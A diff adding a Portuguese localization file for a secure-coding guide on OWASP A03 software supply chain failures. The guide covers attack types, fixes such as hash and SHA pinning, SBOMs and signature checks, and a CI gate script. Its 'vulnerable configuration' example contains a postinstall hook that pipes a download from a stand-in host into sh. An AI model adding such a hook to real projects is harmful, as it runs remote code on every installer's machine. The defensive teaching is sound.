@@ -1,0 +1,156 @@
+{
+  "entries": {
+    "sections.0.body.0": {
+      "t": "Uma falha na cadeia de suprimentos é uma quebra em qualquer ponto da cadeia que entrega software: as dependências que você baixa, o registry de onde as baixa, o sistema de build, os plugins de CI, a imagem base do contêiner e a forma como os artefatos são assinados e implantados.",
+      "h": "ab013b6d"
+    },
+    "sections.0.body.1": {
+      "t": "O OWASP Top 10:2025 a lista como A03, ampliando a antiga categoria sobre componentes vulneráveis e desatualizados para cobrir a cadeia inteira, incluindo pacotes maliciosos e pipelines comprometidos.",
+      "h": "6751b564"
+    },
+    "sections.0.heading": {
+      "t": "O que é",
+      "h": "f8c94a3b"
+    },
+    "sections.1.bullets.0": {
+      "t": "Versão com vulnerabilidade conhecida: uma biblioteca com CVE público permanece no lockfile por anos.",
+      "h": "b10febb5"
+    },
+    "sections.1.bullets.1": {
+      "t": "Typosquatting e dependency confusion: um pacote com nome quase idêntico ou com cara de interno é instalado no lugar do verdadeiro.",
+      "h": "26bdf5af"
+    },
+    "sections.1.bullets.2": {
+      "t": "Mantenedor ou pacote comprometido: um pacote legítimo publica uma atualização maliciosa, muitas vezes com um script de instalação.",
+      "h": "aad712cf"
+    },
+    "sections.1.bullets.3": {
+      "t": "Pipeline envenenado: uma action de CI ou um script de build é alterado, ou fixado em uma tag mutável, e executa código do atacante com os seus segredos.",
+      "h": "cf370f0f"
+    },
+    "sections.1.bullets.4": {
+      "t": "Artefatos não verificados: nada prova que o que roda em produção é o que foi construído a partir do código-fonte revisado.",
+      "h": "e16716c7"
+    },
+    "sections.1.heading": {
+      "t": "Como o ataque funciona",
+      "h": "4443eb22"
+    },
+    "sections.2.body.0": {
+      "t": "Versões sem fixar, uma tag mutável de action de CI e instalação direta a partir de uma URL arbitrária.",
+      "h": "adc8eaa0"
+    },
+    "sections.2.code.0.code": {
+      "t": "{\n  \"dependencies\": {\n    \"left-pad\": \"*\",\n    \"internal-utils\": \"latest\"\n  },\n  \"scripts\": {\n    \"postinstall\": \"curl -s https://example.sh/setup | sh\"\n  }\n}",
+      "h": "8235d981"
+    },
+    "sections.2.code.0.filename": {
+      "t": "package.json",
+      "h": "7030d0b2"
+    },
+    "sections.2.code.1.code": {
+      "t": "steps:\n  - uses: some-org/build-action@main        # ref mutável: muda debaixo de você\n  - run: pip install -r requirements.txt     # sem hashes, sem lockfile\n  - run: docker build -t app .               # FROM python:latest",
+      "h": "a27f8e2c"
+    },
+    "sections.2.code.1.filename": {
+      "t": ".github/workflows/build.yml",
+      "h": "fe77d5d1"
+    },
+    "sections.2.heading": {
+      "t": "Configuração vulnerável",
+      "h": "9248042a"
+    },
+    "sections.3.body.0": {
+      "t": "Saiba o que você entrega (uma lista de materiais de software), trave exatamente o que instala, verifique de onde vem e torne o próprio pipeline confiável. Fixe por identificadores imutáveis (SHA de commit, digest de imagem, hash de conteúdo) e escaneie a cada mudança e em intervalos regulares, porque novos CVEs surgem para código antigo.",
+      "h": "0d98ffeb"
+    },
+    "sections.3.code.0.code": {
+      "t": "# Node: instale exatamente o que o lockfile diz, sem scripts de instalação das dependências\nnpm ci --ignore-scripts\n\n# Python: exija hashes\npip install --require-hashes -r requirements.txt   # gerado por pip-compile --generate-hashes",
+      "h": "7c5f19da"
+    },
+    "sections.3.code.0.filename": {
+      "t": "instalar de forma determinística",
+      "h": "8461f060"
+    },
+    "sections.3.code.1.code": {
+      "t": "permissions:\n  contents: read\nsteps:\n  - uses: some-org/build-action@3f2a1c9d4e5b6a7c8d9e0f1a2b3c4d5e6f708192   # SHA de commit completo\n  - run: pip install --require-hashes -r requirements.txt\n  - run: |\n      syft . -o cyclonedx-json > sbom.json\n      grype sbom:sbom.json --fail-on high",
+      "h": "6a0057f8"
+    },
+    "sections.3.code.1.filename": {
+      "t": ".github/workflows/build.yml",
+      "h": "fe77d5d1"
+    },
+    "sections.3.code.2.code": {
+      "t": "FROM python:3.12-slim@sha256:<digest-you-reviewed>\nCOPY requirements.txt .\nRUN pip install --require-hashes -r requirements.txt",
+      "h": "f3b44dce"
+    },
+    "sections.3.code.2.filename": {
+      "t": "Dockerfile",
+      "h": "6651ddff"
+    },
+    "sections.3.heading": {
+      "t": "A correção",
+      "h": "7188b1fb"
+    },
+    "sections.4.body.0": {
+      "t": "Faça o pipeline falhar quando a cadeia enfraquecer: uma dependência vulnerável, uma referência sem fixar ou um artefato sem assinatura. Essas verificações funcionam igual para qualquer linguagem porque leem o lockfile, o SBOM e os arquivos de workflow.",
+      "h": "0c190e24"
+    },
+    "sections.4.code.0.code": {
+      "t": "set -e\n# dependências vulneráveis (qualquer ecossistema com lockfile)\nosv-scanner --lockfile=package-lock.json --lockfile=requirements.txt\n\n# nenhuma action de workflow pode usar uma ref mutável\nif grep -RInE 'uses: [^@]+@(main|master|latest|v[0-9]+)$' .github/workflows; then\n  echo 'pin actions to a commit SHA'; exit 1\nfi\n\n# o artefato deve estar assinado pela identidade do nosso pipeline\ncosign verify --certificate-identity-regexp 'https://github.com/example/app/.*' \\\n  --certificate-oidc-issuer https://token.actions.githubusercontent.com \\\n  registry.example.com/app@$DIGEST",
+      "h": "1c20b18e"
+    },
+    "sections.4.code.0.filename": {
+      "t": "supply-chain-gate.sh",
+      "h": "26381168"
+    },
+    "sections.4.heading": {
+      "t": "Prove a correção",
+      "h": "665c8226"
+    },
+    "sections.5.bullets.0": {
+      "t": "Mantenha um SBOM para cada release e saiba quais serviços usam quais versões.",
+      "h": "416967e4"
+    },
+    "sections.5.bullets.1": {
+      "t": "Faça commit dos lockfiles; instale a partir deles; revise mudanças de dependências em pull requests.",
+      "h": "dd45a8a4"
+    },
+    "sections.5.bullets.2": {
+      "t": "Prefira poucas dependências mantidas; remova o que não usa mais.",
+      "h": "8f667b8d"
+    },
+    "sections.5.bullets.3": {
+      "t": "Defina um escopo ou namespace de registry privado para pacotes internos para impedir o dependency confusion.",
+      "h": "9e3cfef0"
+    },
+    "sections.5.bullets.4": {
+      "t": "Fixe actions de CI e imagens base em identificadores imutáveis; dê ao CI o mínimo privilégio de que precisa.",
+      "h": "944be6e7"
+    },
+    "sections.5.bullets.5": {
+      "t": "Assine os artefatos e verifique a assinatura antes do deploy.",
+      "h": "4e478b71"
+    },
+    "sections.5.bullets.6": {
+      "t": "Escaneie continuamente: o build limpo de ontem pode ter um CVE hoje.",
+      "h": "237a4a9c"
+    },
+    "sections.5.heading": {
+      "t": "Checklist",
+      "h": "61b29464"
+    },
+    "short": {
+      "t": "comprometimento por aquilo de que você depende, com que compila ou que instala",
+      "h": "60931f9e"
+    },
+    "tagline": {
+      "t": "Sua aplicação é feita, em sua maior parte, de código de outras pessoas. Uma biblioteca vulnerável, um pacote malicioso ou uma etapa de build adulterada chega à produção com o seu nome.",
+      "h": "8482d7a3"
+    },
+    "title": {
+      "t": "A03 Software Supply Chain Failures",
+      "h": "b10e0d52"
+    }
+  }
+}
